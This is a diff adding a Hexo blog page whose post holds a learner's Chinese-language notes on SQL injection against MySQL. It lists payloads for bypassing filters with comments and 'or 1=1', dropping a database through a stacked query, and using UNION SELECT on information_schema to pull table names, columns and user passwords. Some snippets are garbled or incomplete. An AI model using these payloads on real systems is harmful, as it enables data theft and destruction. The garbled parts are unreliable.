@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <meta name="description" content="mysql
+information_schema库:有库名，表名,表字段
+schemata
+tables
+column
+mysql
+performance_schema
+sys
+
+操作
+检索隐藏数据123select * from 库名 where category =&amp;#x27;%s&amp;#x27;变" />
+  
+
+  
+  
+  
+  
+  
+  
+  <title>hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="mysql information_schema库:有库名，表名,表字段 schemata tables column mysql performance_schema sys  操作 检索隐藏数据123select * from 库名 where category &#x3D;&#x27;%s&#x27;变成 select * from 库名 where category &#x3D;&#x27;%s&#x27;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hexo">
+<meta property="og:url" content="http://example.com/2024/11/26/sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="hexo">
+<meta property="og:description" content="mysql information_schema库:有库名，表名,表字段 schemata tables column mysql performance_schema sys  操作 检索隐藏数据123select * from 库名 where category &#x3D;&#x27;%s&#x27;变成 select * from 库名 where category &#x3D;&#x27;%s&#x27;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-11-26T02:44:11.712Z">
+<meta property="article:modified_time" content="2024-11-30T09:31:02.885Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="hexo" rel="home">hexo</a>
+      </h1>
+      
+        <h2 class="site-description hitokoto"></h2>
+        <script type="text/javascript" src="https://v1.hitokoto.cn/?encode=js"></script>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Home2</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-sql注入" class="post-sql注入 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2024/11/26/sql%E6%B3%A8%E5%85%A5/" data-id="cm476du2d0004gsv1bq8113du" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><ul>
+<li>information_schema库:有库名，表名,表字段</li>
+<li>schemata</li>
+<li>tables</li>
+<li>column</li>
+<li>mysql</li>
+<li>performance_schema</li>
+<li>sys</li>
+</ul>
+<h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><ul>
+<li>检索隐藏数据<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 库名 <span class="keyword">where</span> category <span class="operator">=</span><span class="string">&#x27;%s&#x27;</span></span><br><span class="line">变成 <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 库名 <span class="keyword">where</span> category <span class="operator">=</span><span class="string">&#x27;%s&#x27;</span> <span class="string">&#x27; --...</span></span><br><span class="line"><span class="string">或者 select * from 库名 where category =&#x27;</span><span class="operator">%</span>s<span class="string">&#x27; &#x27;</span>#...</span><br></pre></td></tr></table></figure></li>
+<li>修改应用程序逻辑<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 库名 <span class="keyword">where</span> category <span class="operator">=</span><span class="string">&#x27;%s&#x27;</span></span><br><span class="line">变成 <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 库名 <span class="keyword">where</span> category <span class="operator">=</span><span class="string">&#x27;%s&#x27;</span> </span><br><span class="line"><span class="string">&#x27;123=123 -- ....</span></span><br></pre></td></tr></table></figure></li>
+<li>union attack</li>
+<li>获得敏感数据<br>gift’ – </li>
+<li>获得所有数据<br> gift’or 1&#x3D;1 –</li>
+<li>手工注入（利用网页的检查,查接口，因为他是前后端分离，若不是，就看url）</li>
+<li>删库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database 库名</span><br></pre></td></tr></table></figure>
+变成<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 库名 where category =&#x27;%s&#x27;;drop database 库名; --</span><br></pre></td></tr></table></figure>
+(但默认不允许执行多条sql语句,上面这个就是多条sql语句)</li>
+<li>没有网页依旧可以sql注入</li>
+<li>前后端：前端进行数据展示，后端进行数据处理,前端请求客户端正常输入，然后服务端接到请求，就会查数据库</li>
+<li>拿到所有用户名和密码登入系统<br>  <code>database()</code>一个函数，用来返回你当前链接的数据库是哪个<br>  <code>select database()</code> 这样用<br> 回显：输入一个东西，它能给你展示出来<br> 联合使用：<br> <code>select *from &#39;库名&#39; union select ...</code><br> <code>select *from &#39;库名&#39; union select 1,user(),3,version(),database();</code><br> <code>select *from &#39;库名&#39; where category =&#39;%s&#39;union select 1,user(),3,version(),database()&#39; --;</code><br> 注意不是一样数据类型尽量不用,看下数据是字符串还是整形<br> 找表名：<br> <code>select table_name from information_schema.tables where table_schema=database()</code><br> 或者<code>select table_name from information_schema.tables where table_schema=&#39;库名&#39;</code><br> 使用<code>select *from &#39;库名&#39; where category =&#39;%s&#39;union select 1,user(),3,version(),table_name from information_schema.tables where table_schema=database() --</code><br> 即1’union select 1,user(),3,version(),table_name from information_schema.tables where table_schema&#x3D;’库名’ –<br> 找数据名<code>select *from &#39;库名&#39; where category =&#39;%s&#39;union select 1,user(),3,version(),column from information_schema.column where table_name=&#39;表名&#39; --</code><br>   即1’union select 1,user(),3,version(),column from information_schema.column where table_name&#x3D;’库名’ –&#96;</li>
+<li>md5解密网站：cmd5.com</li>
+<li>注入思路：<br>先去找到库,用 union select 这种方式123试下返回几个字段,找到字段数，就去替换这些字段,如user database version这些函数,然后把库名、函数名搜出来,又根据information_schema这张表查,然后查完表，就查我们这个表有什么字段,分析哪些字段有用，最后登入后台</li>
+<li>postman:接口调试</li>
+<li>burp suite:</li>
+<li>get注入方式:在浏览器能看见,(有的项目看不见，可能它是前后端分离–那就检查一下,看network,刷新一下，找到请求的地址,就是看header)</li>
+</ul>
+<h1 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h1><p>  方法一：<br> <code>select *from &#39;库名&#39; where category =&#39;gifts&#39; limit 0,1</code>一次拿一条,从0(第一条)  开始拿<br> <code>select *from &#39;库名&#39; where category =&#39;gifts&#39; limit 1,1</code>一次拿一条,从1(第二条)  开始拿<br> <code>select *from &#39;库名&#39; where category =&#39;gifts&#39; limit 1,2</code>一次拿两条,从1(第二条)  开始拿<br> 还有一个函数查有几条<br> 方法二：<br> <code>select group_concat(content) from &#39;表名&#39;</code>一次性拿出<br><strong>小结</strong><br>1.先判断是什么类型，整形还是字符型，整形就不用‘<br>2.然后用union select 查有几个<br>3.然后替换<br>4.</p>
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><ul>
+<li><p><code>substr</code> 截取字符串<br><code>select substr(&#39;michael&#39;,1,1)</code>比如michael这个字符串从第一个字符开始取,取一个,为m<br><code>select substr(&#39;michael&#39;,2,3)</code>比如michael这个字符串从第2个字符开始取,取3个,为ich</p>
+<p>order by 3 – m<br>order by 4 – e<br>union select 1,2,3 – md5解密网站<br>union select 1,database(),3 – md5解密网站<br>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()<br>union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;users<br>union sele1 1,group_concat(password),group_concat(user_name) from users</p>
+</li>
+</ul>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2024/11/26/sql%E6%B3%A8%E5%85%A5/">
+    <time datetime="2024-11-26T02:44:11.712Z" class="entry-date">
+        2024-11-26
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+    
+<nav class="nav-single">
+    <h3 class="assistive-text">文章导航</h3>
+    
+    
+        <span class="nav-next"><a href="/2024/11/21/php%E7%AC%94%E8%AE%B0/" rel="next">(no title) <span class="meta-nav">→</span></a></span>
+    
+</nav><!-- .nav-single -->
+
+
+
+
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value="" name="s" id="s" />
+        <input type="submit" id="searchsubmit" value="搜索" />
+    </div>
+</form></aside>
+  
+    
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2024/11/26/sql%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/21/php%E7%AC%94%E8%AE%B0/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/17/%E6%96%87%E7%AB%A0/">markdown使用教程</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/17/mysql%E7%AC%94%E8%AE%B0/">mysql笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/04/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  
+    
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2024 John Doe
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/js/share.js'];</script>
+
+<script src="/js/jquery-3.3.1.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
